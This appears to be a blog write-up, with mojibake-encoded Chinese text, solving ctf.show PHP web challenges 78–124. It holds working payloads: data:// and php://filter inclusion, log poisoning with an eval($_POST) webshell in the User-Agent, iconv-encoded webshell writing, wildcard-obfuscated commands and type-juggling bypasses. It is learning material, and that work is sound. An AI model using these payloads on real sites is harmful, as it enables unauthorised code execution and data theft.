<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$&#123;?&#125;=0ï¼Œ$&#123;#?&#125;=1($?æ˜¯è¡¨ç¤ºä¸Šä¸€æ¡å‘½ä»¤æ‰§è¡Œç»“æŸåçš„ä¼ å›å€¼ã€‚é€šå¸¸0ä»£è¡¨æ‰§è¡ŒæˆåŠŸï¼Œé0ä»£è¡¨æ‰§è¡Œæœ‰è¯¯)</span><br><span class="line"></span><br><span class="line">$&#123;#IFS&#125;=3</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">code=$&#123;PWD::$&#123;#?&#125;&#125;???$&#123;PWD::$&#123;#?&#125;&#125;$&#123;PWD:$&#123;#IFS&#125;:$&#123;#?&#125;&#125;?? ????.???</span><br><span class="line"></span><br><span class="line">/???/r?? ????.???</span><br><span class="line">/bin/rev</span><br></pre></td></tr></table></figure>

<h1 id="Web122"><a href="#Web122" class="headerlink" title="Web122"></a>Web122</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payloadï¼š</span><br><span class="line">&lt;A;$&#123;HOME::$?&#125;???$&#123;HOME::$?&#125;?????$&#123;RANDOM::$?&#125; ????.???</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$?è¡¨ç¤ºä¸Šä¸€æ¡å‘½ä»¤æ‰§è¡Œç»“æŸåçš„ä¼ å›å€¼ã€‚é€šå¸¸0ä»£è¡¨æ‰§è¡ŒæˆåŠŸï¼Œé0ä»£è¡¨æ‰§è¡Œæœ‰è¯¯</span><br><span class="line"></span><br><span class="line">ä¸ºä»€ä¹ˆæœ‰ &lt;A</span><br><span class="line"></span><br><span class="line">&lt;Aè¿”å›çš„é”™è¯¯å€¼ ä½¿å¾—$?ä¸º1</span><br><span class="line"></span><br><span class="line">ç„¶åå†ä½¿ç”¨randomå»éšæœºï¼Œå¤šç‚¹å‡ æ¬¡å°±æœ‰å¯ä»¥å¾—åˆ°æºç çš„</span><br></pre></td></tr></table></figure>

<h1 id="Web124"><a href="#Web124" class="headerlink" title="Web124"></a>Web124</h1><p>è®²ä¸‹ä¸»è¦å‡½æ•°</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">base_convert  		#åœ¨ä»»æ„è¿›åˆ¶ä¹‹é—´è½¬æ¢æ•°å­—ã€‚</span><br><span class="line">hexdec 			 #æŠŠåå…­è¿›åˆ¶è½¬æ¢ä¸ºåè¿›åˆ¶ã€‚</span><br><span class="line">dechex 			#æŠŠåè¿›åˆ¶è½¬æ¢ä¸ºåå…­è¿›åˆ¶ã€‚</span><br><span class="line">hex2bin  		#æŠŠåå…­è¿›åˆ¶çš„å­—ç¬¦ä¸²è½¬æ¢ä¸ºASCIIç </span><br></pre></td></tr></table></figure>

<p>æ„é€ $_GET æŠŠå‚æ•°é€ƒé€¸å‡ºå»</p>
<p>è½¬æˆ10è¿›åˆ¶ å¤šè½¬ä¸€å±‚ç»•è¿‡è¿‡æ»¤</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="comment">// æŠŠ hex2binè½¬åŒ–ä¸º10è¿›åˆ¶</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base_convert</span>(<span class="string">&quot;hex2bin&quot;</span>, <span class="number">36</span>, <span class="number">16</span>);   <span class="comment">//37907361743</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base_convert</span>(<span class="string">&quot;8d3746fcf&quot;</span>, <span class="number">16</span>, <span class="number">36</span>);  <span class="comment">//hex2bin</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="comment">//æŠŠ_GET å…ˆè½¬ä¸º16è¿›åˆ¶å†è½¬ä¸º10è¿›åˆ¶</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">hexdec</span>(<span class="title function_ invoke__">bin2hex</span>(<span class="string">&quot;_GET&quot;</span>));  <span class="comment">//1598506324</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base_convert</span>(<span class="string">&quot;8d3746fcf&quot;</span>, <span class="number">16</span>, <span class="number">36</span>)(<span class="title function_ invoke__">dechex</span>(<span class="string">&quot;1598506324&quot;</span>));  <span class="comment">// ç»•è¿‡è¿‡æ»¤æ‹¿åˆ° &quot;_GET&quot;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>é¢˜è§£</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));$$pi&#123;abs&#125;($$pi&#123;acos&#125;)&amp;abs=system&amp;acos=cat%20flag.php</span><br><span class="line"></span><br><span class="line">$$pi&#123;abs&#125;($$pi&#123;acos&#125;)  #ç›¸å½“äº $_GET[&#x27;abs&#x27;]($_GET[&#x27;acos&#x27;])</span><br></pre></td></tr></table></figure>

<h1 id="Web78"><a href="#Web78" class="headerlink" title="Web78"></a>Web78</h1><p>ç›´æ¥ç”¨base64å»è¯»å–å°±å¯ä»¥äº†</p>
<h1 id="Web79"><a href="#Web79" class="headerlink" title="Web79"></a>Web79</h1><p>è¿™é¢˜å‘ç°phpè¢«æ›¿æ¢æ‰äº†ï¼Œæˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨dataåè®®å³å¯</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?file=data:<span class="comment">//text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs=</span></span><br><span class="line">PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs ===&gt; <span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat flag.php&#x27;</span>);</span><br></pre></td></tr></table></figure>

<h1 id="Web80"><a href="#Web80" class="headerlink" title="Web80"></a>Web80</h1><p>è¿™é¢˜æŠŠdataåè®®ä¹Ÿç¦æ‰äº†</p>
<p>è¿™å°±å¾—ä½¿ç”¨æ–‡ä»¶æ—¥å¿—åŒ…å«å»è§£å†³äº†</p>
<p>dataè¢«æ›¿æ¢<br>æ—¥å¿—æ–‡ä»¶åœ°å€</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/var/log/nginx/access.log</span><br></pre></td></tr></table></figure>

<p>User-Agentæ’å…¥</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php eval($_POST[1]);?&gt;</span><br></pre></td></tr></table></figure>

<p>ç„¶åç”¨èšå‰‘å»è¿æ¥å°±èƒ½æ‹¿åˆ°flagäº†ã€‚</p>
<h1 id="Web81"><a href="#Web81" class="headerlink" title="Web81"></a>Web81</h1><p>è¿˜æ˜¯å¯ä»¥ä½¿ç”¨ä¸Šé¢ä¸€é¢˜çš„æ–‡ä»¶æ—¥å¿—åŒ…å«å»å®Œæˆ</p>
<h1 id="Web82-Web86"><a href="#Web82-Web86" class="headerlink" title="Web82-Web86"></a>Web82-Web86</h1><p>sessionæ–‡ä»¶åŒ…å«ï¼Œä½†æ˜¯å› ä¸ºéœ€è¦ç«äº‰çš„ç¯å¢ƒï¼Œå¾—åŠå¤œæ‰æœ‰ï¼Œæ‰€ä»¥å°±å…ˆæ”¾æ”¾ï¼Œç†è§£çŸ¥è¯†ç‚¹æ‰æ˜¯ä¸»è¦</p>
<h1 id="Web87"><a href="#Web87" class="headerlink" title="Web87"></a>Web87</h1><p>dieæ­»äº¡ç»•è¿‡ï¼Œæ¯”è¾ƒç®€å•çš„ä¸€ä¸ªçŸ¥è¯†ç‚¹</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=php://filter/write=convert.base64-decode/resource=2.php</span><br></pre></td></tr></table></figure>

<p>ä¸è¿‡è¦æ³¨æ„çš„ç‚¹æ˜¯è¿™é‡Œéœ€è¦è¿›è¡Œä¸¤æ¬¡urlåŠ å¯†ï¼Œå¹¶ä¸”æ˜¯å…¨å­—æ¯åŠ å¯†</p>
<h1 id="Web88"><a href="#Web88" class="headerlink" title="Web88"></a>Web88</h1><p>å’Œ79é¢˜ä¸€æ ·ï¼Œç”¨dataåè®®å³å¯</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?file=data:<span class="comment">//text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs=</span></span><br><span class="line">PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs ===&gt; <span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat flag.php&#x27;</span>);</span><br></pre></td></tr></table></figure>

<h1 id="Web116"><a href="#Web116" class="headerlink" title="Web116"></a>Web116</h1><p>è¿™é¢˜éœ€è¦ç»“åˆmiscçš„çŸ¥è¯†ç‚¹å»åšï¼Œæˆ‘ä»¬å»å¯¹è§†é¢‘è¿›è¡Œåˆ†ææ‰¾åˆ°æºç ï¼Œç„¶åå°±å¾ˆå®¹æ˜“å¾—å†™å‡ºè¿™é¢˜</p>
<h1 id="Web117"><a href="#Web117" class="headerlink" title="Web117"></a>Web117</h1><p><strong>è§£ç­”</strong>ï¼šä¸¤ä¸ªå‚æ•°ï¼Œæœ‰è¿‡æ»¤ï¼Œæœ‰dieã€‚<br>stringå­—ç¬¦ä¸²è¿‡æ»¤å™¨è¢«è¿‡æ»¤äº†ï¼Œbase64ä¹Ÿè¢«è¿‡æ»¤äº†ï¼Œä½†è¿˜æœ‰convert.iconv.</p>
<p>æŠŠ<a href="https://so.csdn.net/so/search?q=%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC&spm=1001.2101.3001.7020">ä¸€å¥è¯æœ¨é©¬</a>ä»<code>UCS-2LE</code>ç¼–ç è½¬æ¢ä¸º<code>UCS-2BE</code>ç¼–ç ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">iconv</span>(<span class="string">&quot;UCS-2LE&quot;</span>,<span class="string">&quot;UCS-2BE&quot;</span>, <span class="string">&#x27;&lt;?php @eval($_POST[jz]);?&gt;&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;payload:&quot;</span>.<span class="variable">$result</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">#?&lt;hp pe@av(l_$OPTSj[]z;)&gt;?</span></span><br></pre></td></tr></table></figure>

<p>?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.iconv.UCS-2LE.UCS-2BE&#x2F;resource&#x3D;jiuzhen.php<br>postï¼šcontents&#x3D;?&lt;hp pe@av(l_$OPTSj[]z;)&gt;?</p>
<p>èšå‰‘è¿æ¥ï¼Œæˆ–è€…ç›´æ¥è®¿é—®jiuzhen.phpï¼Œpostä¼ å‚ã€‚</p>
<h1 id="Web89"><a href="#Web89" class="headerlink" title="Web89"></a>Web89</h1><p>ç›´æ¥æ•°ç»„ç»•è¿‡å³å¯</p>
<h1 id="Web90"><a href="#Web90" class="headerlink" title="Web90"></a>Web90</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://804aeafe-d39e-4a16-a21d-0daec7483e63.challenge.ctf.show/?num=4476a</span><br></pre></td></tr></table></figure>

<p>ç›´æ¥å¤šåŠ ä¸€ä¸ªå­—æ¯å³å¯</p>
<h1 id="Web91"><a href="#Web91" class="headerlink" title="Web91"></a>Web91</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">i </span><br><span class="line">ä¸åŒºåˆ†(ignore)å¤§å°å†™</span><br><span class="line"></span><br><span class="line">m</span><br><span class="line">å¤š(more)è¡ŒåŒ¹é…</span><br><span class="line">è‹¥å­˜åœ¨æ¢è¡Œ\nå¹¶ä¸”æœ‰å¼€å§‹^æˆ–ç»“æŸ$ç¬¦çš„æƒ…å†µä¸‹ï¼Œ</span><br><span class="line">å°†ä»¥æ¢è¡Œä¸ºåˆ†éš”ç¬¦ï¼Œé€è¡Œè¿›è¡ŒåŒ¹é…</span><br><span class="line"><span class="variable">$str</span> = <span class="string">&quot;abc\nabc&quot;</span>;</span><br><span class="line"><span class="variable">$preg</span> = <span class="string">&quot;/^abc$/m&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span>, <span class="variable">$str</span>,<span class="variable">$matchs</span>);</span><br><span class="line">è¿™æ ·å…¶å®æ˜¯ç¬¦åˆæ­£åˆ™è¡¨è¾¾å¼çš„ï¼Œå› ä¸ºåŒ¹é…çš„æ—¶å€™ å…ˆæ˜¯åŒ¹é…æ¢è¡Œç¬¦å‰é¢çš„ï¼Œæ¥ç€åŒ¹é…æ¢è¡Œç¬¦åé¢çš„ï¼Œä¸¤ä¸ªéƒ½æ˜¯abcæ‰€ä»¥å¯ä»¥é€šè¿‡æ­£åˆ™è¡¨è¾¾å¼ã€‚</span><br><span class="line"></span><br><span class="line">s</span><br><span class="line">ç‰¹æ®Šå­—ç¬¦åœ†ç‚¹ . ä¸­åŒ…å«æ¢è¡Œç¬¦</span><br><span class="line">é»˜è®¤çš„åœ†ç‚¹ . æ˜¯åŒ¹é…é™¤æ¢è¡Œç¬¦ \n ä¹‹å¤–çš„ä»»ä½•å•å­—ç¬¦ï¼ŒåŠ ä¸Šsä¹‹å, .åŒ…å«æ¢è¡Œç¬¦</span><br><span class="line"><span class="variable">$str</span> = <span class="string">&quot;abggab\nacbs&quot;</span>;</span><br><span class="line"><span class="variable">$preg</span> = <span class="string">&quot;/b./s&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">preg_match_all</span>(<span class="variable">$preg</span>, <span class="variable">$str</span>,<span class="variable">$matchs</span>);</span><br><span class="line">è¿™æ ·åŒ¹é…åˆ°çš„æœ‰ä¸‰ä¸ª bg b\n bs</span><br><span class="line"></span><br><span class="line">A</span><br><span class="line">å¼ºåˆ¶ä»ç›®æ ‡å­—ç¬¦ä¸²å¼€å¤´åŒ¹é…;</span><br><span class="line"></span><br><span class="line">D</span><br><span class="line">å¦‚æœä½¿ç”¨$é™åˆ¶ç»“å°¾å­—ç¬¦,åˆ™ä¸å…è®¸ç»“å°¾æœ‰æ¢è¡Œ; </span><br><span class="line"></span><br><span class="line">e</span><br><span class="line">é…åˆå‡½æ•°<span class="title function_ invoke__">preg_replace</span>()ä½¿ç”¨, å¯ä»¥æŠŠåŒ¹é…æ¥çš„å­—ç¬¦ä¸²å½“ä½œæ­£åˆ™è¡¨è¾¾å¼æ‰§è¡Œ; </span><br></pre></td></tr></table></figure>

<p>ç›´æ¥%0aç»•è¿‡å³å¯</p>
<h1 id="Web92"><a href="#Web92" class="headerlink" title="Web92"></a>Web92</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">intval()å‡½æ•°å¦‚æœ$baseä¸º0åˆ™$varä¸­å­˜åœ¨å­—æ¯çš„è¯é‡åˆ°å­—æ¯å°±åœæ­¢è¯»å– ä½†æ˜¯eè¿™ä¸ªå­—æ¯æ¯”è¾ƒç‰¹æ®Šï¼Œå¯ä»¥åœ¨PHPä¸­ä¸æ˜¯ç§‘å­¦è®¡æ•°æ³•ã€‚æ‰€ä»¥ä¸ºäº†ç»•è¿‡å‰é¢çš„==4476æˆ‘ä»¬å°±å¯ä»¥æ„é€  4476e123</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payloadï¼š?num=0x117c</span><br><span class="line"></span><br><span class="line">è¿™é‡Œæˆ‘é‡‡ç”¨çš„æ˜¯16è¿›åˆ¶ç»•è¿‡</span><br><span class="line"></span><br><span class="line">è¿›åˆ¶ç»•è¿‡</span><br></pre></td></tr></table></figure>

<h1 id="Web93"><a href="#Web93" class="headerlink" title="Web93"></a>Web93</h1><p>å¯ä»¥ä½¿ç”¨åˆ«çš„è¿›åˆ¶å³å¯ï¼Œä¸è¿‡åƒä¸‡è¦æ³¨æ„è¿›åˆ¶çš„å‰ç¼€ï¼Œä¸ç„¶å°±ä¼šé»˜è®¤å½“æˆåè¿›åˆ¶å»è¿ç®—äº†</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.0B è¡¨ç¤ºäºŒè¿›åˆ¶çš„å‰ç¼€</span><br><span class="line">2.0O è¡¨ç¤ºå…«è¿›åˆ¶çš„å‰ç¼€ ä¹Ÿå¯ä»¥ä½¿ç”¨0è¡¨ç¤ºå…«è¿›åˆ¶çš„å‰ç¼€</span><br><span class="line">4.0x è¿™ä¸ªæ˜¯åå…­è¿›åˆ¶çš„å‰ç¼€ 0xæ˜¯16è¿›åˆ¶çš„å‰ç¼€ï¼ŒHæ˜¯16è¿›åˆ¶çš„åç¼€</span><br></pre></td></tr></table></figure>

<h1 id="Web94"><a href="#Web94" class="headerlink" title="Web94"></a>Web94</h1><p>è¿‡æ»¤äº†ç¬¬ä¸€ä¸ªæ•°å­—ä¸º0çš„æƒ…å†µï¼Œæ‰€ä»¥å°±æ— æ³•ä½¿ç”¨å…«è¿›åˆ¶å»ç»•è¿‡äº†ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥ä½¿ç”¨å°æ•°å³å¯ã€‚</p>
<h1 id="Web95"><a href="#Web95" class="headerlink" title="Web95"></a>Web95</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">å¯ä»¥é€šè¿‡8è¿›åˆ¶ç»•è¿‡ä½†æ˜¯å‰é¢å¿…é¡»å¤šåŠ ä¸€ä¸ªå­—èŠ‚ï¼ˆåŠ å·ç©ºæ ¼éƒ½è¡Œï¼‰ ?num=+010574æˆ–è€…?num=%2b010574</span><br></pre></td></tr></table></figure>

<h1 id="Web96"><a href="#Web96" class="headerlink" title="Web96"></a>Web96</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./flag.php   ./å½“å‰ç›®å½•</span><br><span class="line">/var/www/html/flag.php</span><br><span class="line">php://filter/resource=flag.php</span><br></pre></td></tr></table></figure>

<h1 id="Web97"><a href="#Web97" class="headerlink" title="Web97"></a>Web97</h1><p>md5æ•°ç»„ç»•è¿‡å³å¯ï¼Œæˆ–è€…md5å¼ºå¼±ç¢°æ’éƒ½è¡Œ</p>
<h1 id="Web98"><a href="#Web98" class="headerlink" title="Web98"></a>Web98</h1><p>æ—¢ç„¶getä¼ å…¥çš„å€¼ä¼šè¢«å®šä½æŒ‡å‘åˆ°postæ‰€å¯¹åº”çš„å€¼ï¼Œé‚£ä¹ˆåªéœ€è¦æœ‰getå­˜åœ¨å³å¯ï¼ŒåŒæ—¶postä¼ å…¥HTTP_FLAG&#x3D;flagå°±å¯ä»¥äº†</p>
<h1 id="Web99"><a href="#Web99" class="headerlink" title="Web99"></a>Web99</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$allow</span> = <span class="keyword">array</span>();<span class="comment">//è®¾ç½®ä¸ºæ•°ç»„</span></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">36</span>; <span class="variable">$i</span> &lt; <span class="number">0x36d</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line"><span class="title function_ invoke__">array_push</span>(<span class="variable">$allow</span>, <span class="title function_ invoke__">rand</span>(<span class="number">1</span>,<span class="variable">$i</span>));<span class="comment">//å‘æ•°ç»„é‡Œé¢æ’å…¥éšæœºæ•°</span></span><br><span class="line">&#125; i</span><br><span class="line"><span class="title function_ invoke__">f</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;n&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">in_array</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;n&#x27;</span>], <span class="variable">$allow</span>))&#123;</span><br><span class="line"><span class="comment">//in_array()å‡½æ•°æœ‰æ¼æ´ æ²¡æœ‰è®¾ç½®ç¬¬ä¸‰ä¸ªå‚æ•° å°±å¯ä»¥å½¢æˆè‡ªåŠ¨è½¬æ¢eg:n=1.phpè‡ªåŠ¨è½¬æ¢ä¸º1</span></span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;n&#x27;</span>], <span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>]);</span><br><span class="line"><span class="comment">//å†™å…¥1.phpæ–‡ä»¶ å†…å®¹æ˜¯&lt;?php system($_POST[1]);?&gt;</span></span><br><span class="line">&#125; ?</span><br><span class="line">&gt;</span><br><span class="line">payload: get : ?n=<span class="number">1</span>.php post:content=</span><br></pre></td></tr></table></figure>

<p>å¾ˆç®€å•çš„ä¸€é“é¢˜ç›®</p>
<h1 id="Web100"><a href="#Web100" class="headerlink" title="Web100"></a>Web100</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?v1=<span class="number">1</span>&amp;v2=<span class="title function_ invoke__">var_dump</span>(<span class="variable">$ctfshow</span>)&amp;v3=;</span><br><span class="line">v1=<span class="number">1</span>&amp;v2=<span class="title function_ invoke__">system</span>(<span class="string">&quot;cat ctfshow.php&quot;</span>)<span class="comment">/*&amp;v3=*/</span>;</span><br><span class="line">?v1=<span class="number">21</span>&amp;v2=<span class="title function_ invoke__">var_dump</span>(<span class="variable">$ctfshow</span>)<span class="comment">/*&amp;v3=*/</span>;</span><br></pre></td></tr></table></figure>

<h1 id="Web101"><a href="#Web101" class="headerlink" title="Web101"></a>Web101</h1><p>è¿™é‡Œéœ€è¦ç”¨åˆ°phpåå°„ç±»</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?v1=1&amp;v2=echo new ReflectionClass&amp;v3=;</span><br></pre></td></tr></table></figure>

<h1 id="Web102"><a href="#Web102" class="headerlink" title="Web102"></a>Web102</h1><p>åˆ©ç”¨base64ï¼ŒåŒæ—¶é…åˆä¼ªåè®®å»å†™å…¥ï¼Œä½†æ˜¯éœ€è¦ä¿è¯é€šè¿‡is_numberå‡½æ•°çš„åˆ¤æ–­ï¼Œå¯ä»¥æœ‰å­—æ¯å•Šï¼Œä½†æ˜¯å¿…å¾—æ˜¯eå•Šï¼Œä¹Ÿå°±æ˜¯ç§‘å­¦è®¡æ•°æ³•å•Šï¼Œæ¥è‡ªåŒä¸€å®¶çš„payloadå•Šï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$a=&#x27;&lt;?=`cat *`;&#x27;;</span><br><span class="line">$b=base64_encode($a);  // PD89YGNhdCAqYDs=</span><br><span class="line">$c=bin2hex($b);      //è¿™é‡Œç›´æ¥ç”¨å»æ‰=çš„base64</span><br><span class="line">è¾“å‡º   5044383959474e6864434171594473</span><br><span class="line"></span><br><span class="line">å¸¦eçš„è¯ä¼šè¢«è®¤ä¸ºæ˜¯ç§‘å­¦è®¡æ•°æ³•ï¼Œå¯ä»¥é€šè¿‡is_numericæ£€æµ‹ã€‚</span><br><span class="line">å¤§å®¶å¯ä»¥å°è¯•ä¸‹å»æ‰=å’Œå¸¦ç€=çš„base64è§£ç å‡ºæ¥çš„å†…å®¹æ˜¯ç›¸åŒçš„ã€‚å› ä¸ºç­‰å·åœ¨base64ä¸­åªæ˜¯èµ·åˆ°å¡«å……çš„ä½œç”¨ï¼Œä¸å½±å“å…·ä½“çš„æ•°æ®å†…å®¹ã€‚</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?v2=115044383959474e6864434171594473&amp;v3=php://filter/write=convert.base64-decode/resource=1.php</span><br></pre></td></tr></table></figure>

<p>postï¼šv1&#x3D;hex2bin</p>
<p>ç„¶åè®¿é—®1.phpå»è§¦å‘å°±å¯ä»¥äº†</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">æ³¨æ„åŒºåˆ«bin2hexå’Œhex2bin</span><br></pre></td></tr></table></figure>

<h1 id="Web103"><a href="#Web103" class="headerlink" title="Web103"></a>Web103</h1><p>å’Œä¸Šé¢˜ä¸€æ ·çš„åšæ³•å³å¯</p>
<h1 id="Web104"><a href="#Web104" class="headerlink" title="Web104"></a>Web104</h1><p>sha1ç»•è¿‡</p>
<p>å’Œmd5ç»•è¿‡ä¸€æ ·çš„</p>
<h1 id="Web105"><a href="#Web105" class="headerlink" title="Web105"></a>Web105</h1><p>è¿™é¢˜å°±æ˜¯å¾ˆç®€å•çš„å˜é‡ä¼ é€’å³å¯ï¼Œ</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?suces=flag</span><br><span class="line">postï¼šerror=suces</span><br></pre></td></tr></table></figure>

<h1 id="Web106"><a href="#Web106" class="headerlink" title="Web106"></a>Web106</h1><p>è¿˜æ˜¯å’Œ104ä¸€æ ·çš„sha1ç»•è¿‡1</p>
<h1 id="Web107"><a href="#Web107" class="headerlink" title="Web107"></a>Web107</h1><p>ç¬¬ä¸€ç§æ–¹æ³•</p>
<p>åˆ©ç”¨md5ç¢°æ’ï¼šä½¿å¾—v1ä¸­çš„flag&#x3D;0ï¼Œç„¶åv3&#x3D;0(md5(QNKCDZO)&#x3D;0eâ€¦)</p>
<p>payloadï¼š<code>vl=flag=0ï¼Œv3=QNKCDZO)</code></p>
<p>ç¬¬äºŒç§æ–¹æ³•</p>
<p>æ•°ç»„ç»•è¿‡å³å¯</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?v3[]=2&amp;flag[]=32</span><br><span class="line">postï¼šv1=v2=$_GET</span><br></pre></td></tr></table></figure>

<h1 id="Web108"><a href="#Web108" class="headerlink" title="Web108"></a>Web108</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ereg()é™åˆ¶passwordçš„æ ¼å¼ï¼Œåªèƒ½æ˜¯æ•°å­—æˆ–è€…å­—æ¯ã€‚ä½†ereg()å‡½æ•°å­˜åœ¨NULLæˆªæ–­æ¼æ´ï¼Œå¯ä»¥ä½¿ç”¨%00ç»•è¿‡éªŒè¯ã€‚</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">â‘ %00æˆªæ–­åŠé‡åˆ°%00åˆ™é»˜è®¤ä¸ºå­—ç¬¦ä¸²çš„ç»“æŸ</span><br><span class="line"></span><br><span class="line">â‘¡å½“ntfä¸ºæ•°ç»„æ—¶å®ƒçš„è¿”å›å€¼ä¸æ˜¯FALSE</span><br></pre></td></tr></table></figure>

<p>è¿™é¢˜è¿˜è¦æ³¨æ„<a href="https://www.php.net/strrev">strrevå‡½æ•°</a>ï¼Œåè½¬å­—ç¬¦ä¸²</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=a%00778</span><br></pre></td></tr></table></figure>

<h1 id="Web109"><a href="#Web109" class="headerlink" title="Web109"></a>Web109</h1><p>è¿™é¢˜ä½¿ç”¨åå°„ç±»å³å¯å¾ˆç®€å•çš„å®Œæˆäº†ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?v1=ReflectionClass&amp;v2=system(&#x27;tac fl36dg.txt&#x27;)</span><br></pre></td></tr></table></figure>

<p>å½“ç„¶ä¹Ÿå¯ä»¥ä½¿ç”¨åˆ«çš„æ–¹æ³•</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?v1=Exception&amp;v2=system(&#x27;cat fl36dg.txt&#x27;)</span><br></pre></td></tr></table></figure>

<p>æ€»ç»“</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?v1=<span class="built_in">Exception</span>();<span class="title function_ invoke__">system</span>(<span class="string">&quot;ls&quot;</span>);<span class="comment">//&amp;v2=a</span></span><br><span class="line">?v1=ReflectionClass&amp;v2=<span class="title function_ invoke__">system</span>(<span class="string">&quot;ls&quot;</span>)</span><br><span class="line">?v1=<span class="title function_ invoke__">ReflectionClass</span>(<span class="string">&quot;PDO&quot;</span>);<span class="title function_ invoke__">system</span>(<span class="string">&quot;ls&quot;</span>);<span class="comment">//&amp;v2=a</span></span><br></pre></td></tr></table></figure>

<h1 id="Web110"><a href="#Web110" class="headerlink" title="Web110"></a>Web110</h1><p>FilesystemIteratorè·å–ç›®å½•æ–‡ä»¶</p>
<p>getcwd()å‡½æ•°å–å¾—å½“å‰å·¥ä½œç›®å½•</p>
<p><strong>æ„é€ playloadï¼š</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">v1=FilesystemIterator&amp;v2=getcwd</span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°å½“å‰ç›®å½•çš„ç¬¬ä¸€ä¸ªæ–‡ä»¶åå­—ï¼šfl36dga.txtï¼Œç„¶åè®¿é—®å³å¯ï¼Œç¼ºé™·ï¼šåªèƒ½è·å–ç¬¬ä¸€ä¸ªæ–‡ä»¶åå­—</p>
<h1 id="Web111"><a href="#Web111" class="headerlink" title="Web111"></a>Web111</h1><p>ä¸»è¦æ˜¯å…¨å±€å˜é‡</p>
<p>è¾“å‡ºGLOBALSå³å¯</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?v1=sctfshow&amp;v2=GLOBALS</span><br></pre></td></tr></table></figure>

